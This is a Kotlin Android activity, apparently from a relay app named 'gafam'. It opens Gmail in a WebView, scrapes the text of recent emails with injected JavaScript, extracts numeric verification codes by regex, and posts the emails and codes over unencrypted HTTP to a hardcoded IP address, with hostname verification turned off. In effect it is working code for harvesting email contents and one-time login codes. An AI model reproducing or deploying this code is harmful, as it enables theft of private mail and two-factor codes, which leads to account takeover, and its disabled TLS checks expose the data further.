package com.gafam.relay

import android.app.Activity
import android.graphics.Bitmap
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONArray
import org.json.JSONObject
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class GmailScrapeActivity : Activity() {
    companion object { private const val TAG = "GAFAM_GmailScrape" }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val isSetup = intent.getBooleanExtra("setup", false)

        val wv = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"
        }
        CookieManager.getInstance().acceptCookie()
        setContentView(wv)

        wv.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                Log.i(TAG, "Page: $url")
                if (url.contains("accounts.google.com")) {
                    Log.w(TAG, "Login needed")
                    if (!isSetup) view.postDelayed({ finish() }, 30000)
                    return
                }
                if (url.contains("mail.google.com")) {
                    // Wait for email list to render
                    view.postDelayed({ scrapeEmails(view) }, 3000)
                }
            }
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                Log.d(TAG, "Started: $url")
            }
        }

        Log.i(TAG, "Loading Gmail...")
        wv.clearCache(true)
        wv.loadUrl("https://mail.google.com/mail/u/0/")
    }

    private fun scrapeEmails(view: WebView) {
        view.evaluateJavascript("""
            (function(){
                var t = document.body.textContent;
                // Extract email lines: format is "HH:MM Sender Subject Content..."
                var re = /(\d{2}:\d{2})([A-Z].*?)(?=\d{2}:\d{2}|$)/g;
                var emails = [];
                var m;
                while ((m = re.exec(t)) !== null) {
                    emails.push(m[1] + ' ' + m[2].trim().slice(0, 120));
                }
                return JSON.stringify(emails.slice(0,10));
            })()
        """.trimIndent()) { result ->
            Log.i(TAG, "Emails: ${result?.take(800)}")
            if (result != null && result != "null" && result != "[]") {
                try {
                    val clean = result.trim('"').replace("\\\"", "\"")
                    val arr = JSONArray(clean)
                    for (i in 0 until arr.length()) {
                        val text = arr.getString(i)
                        val codes = extractCodes(text)
                        // Send in background (not on main thread)
                        thread(name = "gmail-send") { sendToVpc(text, codes) }
                    }
                } catch (e: Exception) { Log.e(TAG, "Parse: ${e.message}") }
            }
            finish()
        }
    }

    private fun extractCodes(text: String): List<String> {
        val patterns = listOf(
            Regex("""\b(\d{4,8})\b"""),
            Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        )
        val codes = mutableListOf<String>()
        for (pat in patterns) for (m in pat.findAll(text)) {
            val c = m.groupValues.getOrNull(1) ?: m.value
            if (c !in codes) codes.add(c)
        }
        return codes
    }

    private fun sendToVpc(text: String, codes: List<String>) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null)
        val jwtSecret = prefs.getString("jwtSecret", null)
        if (apiUrl == null || jwtSecret == null) { Log.e(TAG, "Not paired"); return }
        try {
            // Use raw OkHttp (bypass cert pinning for now)
            val plainBody = JSONObject().apply {
                put("app", "gmail.scrape"); put("title", text); put("body", text)
                put("codes", JSONObject.wrap(codes)); put("timestamp", System.currentTimeMillis())
            }
            val client = OkHttpClient.Builder()
                .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
                .hostnameVerifier { _, _ -> true }
                .build()
            val req = Request.Builder()
                .url("http://46.101.144.151:5150/api/auth/email/notif")
                .post(plainBody.toString().toRequestBody("application/json".toMediaType()))
                .addHeader("Authorization", "Bearer $jwtSecret")
                .build()
            val resp = client.newCall(req).execute()
            Log.i(TAG, "VPC: ${resp.code} ${resp.body?.string()?.take(100)}")
        } catch (e: Exception) { Log.e(TAG, "Send err: ${e.javaClass.simpleName}: ${e.message}") }
    }

    override fun onBackPressed() { finish() }
}
